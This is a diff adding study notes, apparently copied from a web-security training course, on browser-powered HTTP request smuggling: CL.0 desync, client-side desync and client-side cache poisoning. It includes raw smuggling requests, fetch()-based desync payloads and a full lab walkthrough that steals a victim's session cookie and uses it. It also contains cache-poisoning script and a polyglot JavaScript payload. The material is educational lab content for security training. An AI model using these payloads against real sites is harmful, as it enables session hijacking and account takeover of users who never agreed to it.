@@ -1,0 +1,566 @@
+								⚪️ Browser-powered request smuggling
+
+# In this section, you'll learn how you can craft high-severity exploits without relying on malformed requests that browsers will never send. 
+# Not only does this expose a whole new range of websites to server-side request smuggling, it enables you to perform client-side variations of these attacks by inducing a victim's browser to poison its own connection to a vulnerable web server. 
+
+								⚪️ CL.0 request smuggling
+
+▫️ Request smuggling vulnerabilities are the result of discrepancies in how chained systems determine where each request starts and ends. 
+▫️ This is typically due to inconsistent header parsing, leading to one server using a request's Content-Length and the other treating the message as chunked. 
+▫️ However, it's possible to perform many of the same attacks without relying on either of these issues.
+
+▫️ In some instances, servers can be persuaded to ignore the Content-Length header, meaning they assume that each request finishes at the end of the headers. 
+▫️ This is effectively the same as treating the Content-Length as 0.
+
+▫️ If the back-end server exhibits this behavior, but the front-end still uses the Content-Length header to determine where the request ends, you can potentially exploit this discrepancy for HTTP request smuggling. 
+▫️ We've decided to call this a "CL.0" vulnerability. 
+
+								⚪️ Testing for CL.0 vulnerabilities
+
+▫️ To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. 
+▫️ You can then check to see whether the response to the follow-up request was affected by the smuggled prefix. 
+
+▫️ In the following example, the follow-up request for the home page has received a 404 response. 
+▫️ This strongly suggests that the back-end server interpreted the body of the POST request (GET /hopefully404...) as the start of another request. 	
+
+----------------------------------------------------------------------------------------
+
+POST /vulnerable-endpoint HTTP/1.1				HTTP/1.1 200 OK
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: xGET / HTTP/1.1
+Host: vulnerable-website.com 					HTTP/1.1 404 Not Found
+---------------------------------------------------------------------------------------------
+
+▫️ Crucially, notice that we haven't tampered with the headers in any way - the length of the request is specified by a perfectly normal, accurate Content-Length header.
+
+▫️ To try this yourself using Burp Repeater: 
+
+	1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
+
+	2. Add the two tabs to a group in the correct order.
+
+	3. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+
+	4. Change the Connection header to keep-alive.
+
+	5. Send the sequence and check the responses.
+
+▫️ In the wild, we've mostly observed this behavior on endpoints that simply aren't expecting POST requests, so they implicitly assume that no requests have a body. 
+▫️ Endpoints that trigger server-level redirects and requests for static files are prime candidates. 
+
+
+
+▫️ If you can't find any endpoints that appear vulnerable, you can try eliciting this behavior instead.
+
+▫️ When a request's headers trigger a server error, some servers issue an error response without consuming the request body off the socket. 
+
+▫️If they don't close the connection afterwards, this can provide an alternative CL.0 desync vector.
+
+▫️ You can also try using GET requests with an obfuscated Content-Length header. 
+▫️ If you're able to hide this from the back-end server but not the front-end, this also has the potential to cause a desync. 
+▫️ We looked at some header obfuscation techniques when we covered TE.TE request smuggling. 
+
+
+🔘️ Lab: CL.0 request smuggling
+
+▫️ This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints. 
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+▫️ From the Proxy > HTTP history, send the GET / request to Burp Repeater twice.
+
+▫️In Burp Repeater, add both of these tabs to a new group.
+
+▫️Go to the first request and convert it to a POST request (right-click and select Change request method).
+
+▫️In the body, add an arbitrary request smuggling prefix. The result should look something like this:
+
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: CORRECT
+
+    GET /hopefully404 HTTP/1.1
+    Foo: x
+
+▫️Change the path of the main POST request to point to an arbitrary endpoint that you want to test.
+
+▫️Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+
+▫️Change the Connection header of the first request to keep-alive.
+
+▫️Send the sequence and check the responses.
+
+▫️If the server responds to the second request as normal, this endpoint is not vulnerable.
+
+▫️If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.
+
+▫️Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync.
+
+<> Exploit
+
+▫️In Burp Repeater, change the path of your smuggled prefix to point to /admin.
+
+▫️Send the requests in sequence again and observe that the second request has successfully accessed the admin panel.
+
+▫️Smuggle a request to GET /admin/delete?username=carlos request to solve the lab.
+
+    POST /resources/images/blog.svg HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE
+    Connection: keep-alive
+    Content-Length: CORRECT
+
+    GET /admin/delete?username=carlos HTTP/1.1
+    Foo: x
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+									⚪️ Client-side desync
+
+▫️  Request smuggling is traditionally considered a server-side issue because it can only be exploited using specialist tools like Burp Repeater - standard browsers simply won't send the kinds of requests needed to trigger the desync. However, building on the lessons learned from CL.0 attacks, it's sometimes possible to cause a desync using fully browser-compatible HTTP/1 requests.
+
+You can use these browser-compatible requests to trigger a client-side desync (CSD) between a browser and vulnerable web server, enabling attacks on single-server sites, which are otherwise immune to request smuggling, and intranet sites that you can't access directly. 									
+							
+
+🔘️ What is a client-side desync?
+
+▫️ A client-side desync (CSD) is an attack that makes the victim's web browser desynchronize its own connection to the vulnerable website. 
+▫️ This can be contrasted with regular request smuggling attacks, which desynchronize the connection between a front-end and back-end server. 
+
+▫️ Web servers can sometimes be encouraged to respond to POST requests without reading in the body. 
+▫️ If they subsequently allow the browser to reuse the same connection for additional requests, this results in a client-side desync vulnerability.
+
+▫️ In high-level terms, a CSD attack involves the following stages: 	
+
+
+
+    1. The victim visits a web page on an arbitrary domain containing malicious JavaScript.
+
+    2. The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
+
+    3. The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
+
+    4. The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.
+
+▫️ As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable. 
+
+
+🔘️ Note
+
+▫️ For these attacks to work, it's important to note that the target web server must not support HTTP/2. Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.
+
+▫️ One exception to this rule is if you suspect that your intended victim will access the site via a forward proxy that only supports HTTP/1.1.
+
+
+							⚪️ Testing for client-side desync vulnerabilities
+
+▫️ Due to the added complexity of relying on a browser to deliver your attack, it's important to be methodical when testing for client-side desync vulnerabilities. 
+▫️ Although it may be tempting to jump ahead at times, we recommend the following workflow. 
+▫️ This ensures that you confirm your assumptions about each element of the attack in stages. 							
+
+
+
+    1. Probe for potential desync vectors in Burp.
+
+    2. Confirm the desync vector in Burp.
+
+    3. Build a proof of concept to replicate the behavior in a browser.
+
+    4. Identify an exploitable gadget.
+
+    5. Construct a working exploit in Burp.
+
+    6. Replicate the exploit in your browser.
+
+▫️ Both Burp Scanner and the HTTP Request Smuggler extension can help you automate much of this process, but it's useful to know how to do this manually to cement your understanding of how it works. 
+
+🔘️ Probing for client-side desync vectors
+
+▫️The first step in testing for client-side desync vulnerabilities is to identify or craft a request that causes the server to ignore the Content-Length header. 
+▫️The simplest way to probe for this behavior is by sending a request in which the specified Content-Length is longer than the actual body:
+
+    1. If the request just hangs or times out, this suggests that the server is waiting for the remaining bytes promised by the headers.
+
+    2. If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.
+
+▫️ As with CL.0 vulnerabilities, we've found that the most likely candidates are endpoints that aren't expecting POST requests, such as static files or server-level redirects. 
+
+▫️Alternatively, you may be able to elicit this behavior by triggering a server error. In this case, remember that you still need a request that a browser will send cross-domain. 
+▫️In practice, this means you can only tamper with the URL, body, plus a few odds and ends like the Referer header and latter part of the Content-Type header. 
+
+
+		Referer: https://evil-user.net/?%00
+		Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
+
+▫️ You may also be able to trigger server errors by attempting to navigate above the web root. Just remember that browsers normalize the path, so you'll need to URL encode the characters for your traversal sequence: 
+
+	GET /%2e%2e%2f HTTP/1.1
+
+🔘️ Confirming the desync vector in Burp
+
+▫️ It's important to note that some secure servers respond without waiting for the body but still parse it correctly when it arrives. 
+▫️ Other servers don't handle the Content-Length correctly but close the connection immediately after responding, making them unexploitable. 
+
+
+▫️ To filter these out, try sending two requests down the same connection to see if you can use the body of the first request to affect the response to the second one, just like you would when probing for CL.0 request smuggling. 
+
+🔘️ Building a proof of concept in a browser
+
+▫️ Once you've identified a suitable vector using Burp, it's important to confirm that you can replicate the desync in a browser.
+Browser requirements
+
+▫️ To reduce the chance of any interference and ensure that your test simulates an arbitrary victim's browser as closely as possible:
+
+▫️Use a browser that is not proxying traffic through Burp Suite - using any HTTP proxy can have a significant impact on the success of your attacks. We recommend Chrome as its developer tools provide some useful troubleshooting features.
+
+▫️Disable any browser extensions.
+
+    1. Go to the site from which you plan to launch the attack on the victim. This must be on a different domain to the vulnerable site and be accessed over HTTPS. For the purpose of our labs, you can use the provided exploit server.
+
+    2. Open the browser's developer tools and go to the Network tab.
+
+  ◽️ Make the following adjustments:
+
+        1. Select the Preserve log option.
+
+        2. Right-click on the headers and enable the Connection ID column.
+
+    ▫️This ensures that each request that the browser sends is logged on the Network tab, along with details of which connection it used. This can help with troubleshooting any issues later.
+
+▫️Switch to the Console tab and use fetch() to replicate the desync probe you tested in Burp. The code should look something like this:
+
+fetch('https://vulnerable-website.com/vulnerable-endpoint', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', // malicious prefix
+    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
+    credentials: 'include' // poisons the "with-cookies" connection pool
+}).then(() => {
+    location = 'https://vulnerable-website.com/' // uses the poisoned connection
+})
+
+▫️ In addition to specifying the POST method and adding our malicious prefix to the body, notice that we've set the following options:
+
+   <> mode: 'no-cors' - This ensures that the connection ID of each request is visible on the Network tab, which can help with troubleshooting.
+
+   <> credentials: 'include' - Browsers generally use separate connection pools for requests with cookies and those without. This option ensures that you're poisoning the "with-cookies" pool, which you'll want for most exploits.
+
+▫️ When you run this command, you should see two requests on the Network tab. The first request should receive the usual response. 
+▫️ If the second request receives the response to the malicious prefix (in this case, a 404), this confirms that you have successfully triggered a desync from your browser. 
+
+
+🔘️ Handling redirects
+
+▫️ As we've mentioned already, requests to endpoints that trigger server-level redirects are a common vector for client-side desyncs. 
+▫️ When building an exploit, this presents a minor obstacle because browsers will follow this redirect, breaking the attack sequence. 
+▫️ Thankfully, there's an easy workaround. 
+
+▫️ By setting the mode: 'cors' option for the initial request, you can intentionally trigger a CORS error, which prevents the browser from following the redirect. 
+▫️ You can then resume the attack sequence by invoking catch() instead of then(). 
+▫️ For example: 
+
+fetch('https://vulnerable-website.com/redirect-me', {
+    method: 'POST',
+    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+    mode: 'cors',
+    credentials: 'include'
+}).catch(() => {
+    location = 'https://vulnerable-website.com/'
+})
+
+▫️ The downside to this approach is that you won't be able to see the connection ID on the Network tab, which may make troubleshooting more difficult. 
+
+🔘️ Exploiting client-side desync vulnerabilities
+
+▫️ Once you've found a suitable vector and confirmed that you can successfully cause the desync in a browser, you're ready to start looking for exploitable gadgets. 
+
+🔘️ Client-side variations of classic attacks
+
+▫️ You can use these techniques to perform many of the same attacks as you can with server-side request smuggling. All you need is for the victim to visit a malicious website that causes their browser to launch the attack. 
+
+⚫️ Lab: Client-side desync
+
+▫️ This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. 
+▫️ You can exploit this to induce a victim's browser to disclose its session cookie.
+
+▫️ To solve the lab:
+
+    1. Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.
+
+    2. Identify a gadget that enables you to store text data within the application.
+
+    3. Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
+
+    4. Use the stolen cookie to access the victim's account
+
+---------------------------------------------------------------------------------------
+
+
+
+Identify a vulnerable endpoint
+
+    Notice that requests to / result in a redirect to /en.
+
+    Send the GET / request to Burp Repeater.
+
+    In Burp Repeater, use the tab-specific settings to disable the Update Content-Length option.
+
+    Convert the request to a POST request (right-click and select Change request method).
+
+    Change the Content-Length to 1 or higher, but leave the body empty.
+
+    Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified Content-Length.
+
+Confirm the desync vector in Burp
+
+    Re-enable the Update Content-Length option.
+
+    Add an arbitrary request smuggling prefix to the body:
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Connection: close
+    Content-Length: CORRECT
+
+    GET /hopefully404 HTTP/1.1
+    Foo: x
+
+    Add a normal request for GET / to the tab group, after your malicious request.
+
+    Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+
+    Change the Connection header of the first request to keep-alive.
+
+    Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync.
+
+Replicate the desync vector in your browser
+
+    Open a separate instance of Chrome that is not proxying traffic through Burp.
+
+    Go to the exploit server.
+
+    Open the browser developer tools and go to the Network tab.
+
+    Ensure that the Preserve log option is selected and clear the log of any existing entries.
+
+    Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:
+    fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+        method: 'POST',
+        body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
+        mode: 'cors',
+        credentials: 'include',
+    }).catch(() => {
+            fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+            mode: 'no-cors',
+            credentials: 'include'
+        })
+    })
+
+    Note that we're intentionally triggering a CORS error to prevent the browser from following the redirect, then using the catch() method to continue the attack sequence.
+
+    On the Network tab, you should see two requests:
+
+        The main request, which has triggered a CORS error.
+
+        A request for the home page, which received a 404 response.
+
+    This confirms that the desync vector can be triggered from a browser.
+
+Identify an exploitable gadget
+
+    Back in Burp's browser, visit one of the blog posts and observe that this lab contains a comment function.
+
+    From the Proxy > HTTP history, find the GET /en/post?postId=x request. Make note of the following:
+
+        The postId from the query string
+
+        Your session and _lab_analytics cookies
+
+        The csrf token
+
+    In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example:
+
+    Request 1:
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Connection: keep-alive
+    Content-Length: CORRECT
+
+    POST /en/post/comment HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+    Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE
+    Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
+    Content-Type: x-www-form-urlencoded
+    Connection: keep-alive
+
+    csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=
+                            
+
+    Request 2:
+    GET /capture-me HTTP/1.1
+    Host: YOUR-LAB-ID.h1-web-security-academy.net
+
+    Note that the number of bytes that you try to capture must be longer than the body of your POST /en/post/comment request prefix, but shorter than the follow-up request.
+
+    Back in the browser, refresh the blog post and confirm that you have successfully output the start of your GET /capture-me request in a comment.
+
+Replicate the attack in your browser
+
+    Open a separate instance of Chrome that is not proxying traffic through Burp.
+
+    Go to the exploit server.
+
+    Open the browser developer tools and go to the Network tab.
+
+    Ensure that the Preserve log option is selected and clear the log of any existing entries.
+
+    Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:
+    fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
+            method: 'POST',
+            body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
+            mode: 'cors',
+            credentials: 'include',
+        }).catch(() => {
+            fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
+            mode: 'no-cors',
+            credentials: 'include'
+        })
+    })
+
+🔘️ On the Network tab, you should see three requests:
+
+        1. The initial request, which has triggered a CORS error.
+
+        2. A request for /capture-me, which has been redirected to the post confirmation page.
+
+        3. A request to load the post confirmation page.
+
+▫️ Refresh the blog post and confirm that you have successfully output the start of your own /capture-me request via a browser-initiated attack.
+
+🔘️ Exploit
+
+    1. Go to the exploit server.
+
+    2. In the Body panel, paste the script that you tested in the previous section.
+
+    3. Wrap the entire script in HTML <script> tags.
+
+    4. Store the exploit and click Deliver to victim.
+
+    5. Refresh the blog post and confirm that you have captured the start of the victim user's request.
+
+    6. Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim's session cookie.
+
+    7.In Burp Repeater, send a request for /my-account using the victim's stolen cookie to solve the lab.
+
+--------------------------------------------------------------------------------------------------------------
+
+🔘️ Client-side cache poisoning
+
+▫️We previously covered how you can use a server-side desync to turn an on-site redirect into an open redirect, enabling you to hijack a JavaScript resource import. ▫️You can achieve the same effect just using a client-side desync, but it can be tricky to poison the right connection at the right time. 
+▫️It's much easier to use a desync to poison the browser's cache instead. 
+▫️This way, you don't need to worry about which connection it uses to load the resource.
+
+▫️In this section, we'll walk you through the process of constructing this attack. This involves the following high-level steps: 
+
+
+    1. Identify a suitable CSD vector and desync the browser's connection.
+
+    2. Use the desynced connection to poison the cache with a redirect.
+
+    3. Trigger the resource import from the target domain.
+
+    4. Deliver a payload.
+
+
+<> Note
+
+▫️When testing this attack in a browser, make sure you clear your cache between each attempt (Settings > Clear browsing data > Cached images and files).
+
+🔘️ Poisoning the cache with a redirect
+
+▫️ Once you've found a CSD vector and confirmed that you can replicate it in a browser, you need to identify a suitable redirect gadget. 
+▫️ After that, poisoning the cache is fairly straightforward. 
+
+▫️First, tweak your proof of concept so that the smuggled prefix will trigger a redirect to the domain where you'll host your malicious payload. 
+▫️Next, change the follow-up request to a direct request for the target JavaScript file.
+
+▫️ The resulting code should look something like this: 
+
+<script>
+    fetch('https://vulnerable-website.com/desync-vector', {
+        method: 'POST',
+        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
+        credentials: 'include',
+        mode: 'no-cors'
+    }).then(() => {
+        location = 'https://vulnerable-website.com/resources/target.js'
+    })
+</script>
+
+▫️ This will poison the cache, albeit with an infinite redirect back to your script. You can confirm this by viewing the script in a browser and studying the Network tab in the developer tools. 
+
+
+<> Note
+
+▫️ You need to trigger the follow-up request via a top-level navigation to the target domain. Due to the way browsers partition their cache, issuing a cross-domain request using fetch() will poison the wrong cache.
+
+
+🔘️ Triggering the resource import
+
+▫️Sending your victim into an infinite loop may be mildly irritating, but it's not much of an exploit. 
+▫️You now need to further develop your script so that when the browser returns having already poisoned its cache, it is navigated to a page on the vulnerable site that will trigger the resource import. 
+▫️This is easily achieved using conditional statements to execute different code depending on whether the browser window has viewed your script already. 
+
+
+▫️When the browser attempts to import the resource on the target site, it will use its poisoned cache entry and be redirected back to your malicious page for a third time. 
+
+🔘️ Delivering a payload
+
+▫️At this stage, you've laid the foundations for an attack, but the final challenge is working out how to deliver a potentially harmful payload.
+
+▫️Initially, the victim's browser loads your malicious page as HTML and executes the nested JavaScript in the context of your own domain. 
+▫️When it eventually attempts to import the JavaScript resource on the target domain and gets redirected to your malicious page, you'll notice that the script doesn't execute. 
+▫️This is because you're still serving HTML when the browser is expecting JavaScript.
+
+▫️For an actual exploit, you need a way to serve plain JavaScript from the same endpoint, while ensuring that this only executes at this final stage to avoid interfering with the setup requests.
+
+▫️One possible approach is to create a polyglot payload by wrapping the HTML in JavaScript comments: 
+
+alert(1);
+/*
+<script>
+    fetch( ... )
+</script>
+*/
+
+▫️ When the browser loads the page as HTML, it will only execute the JavaScript in the <script> tags. 
+▫️When it eventually loads this in a JavaScript context, it will only execute the alert() payload, treating the rest of the content as arbitrary developer comments. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+															
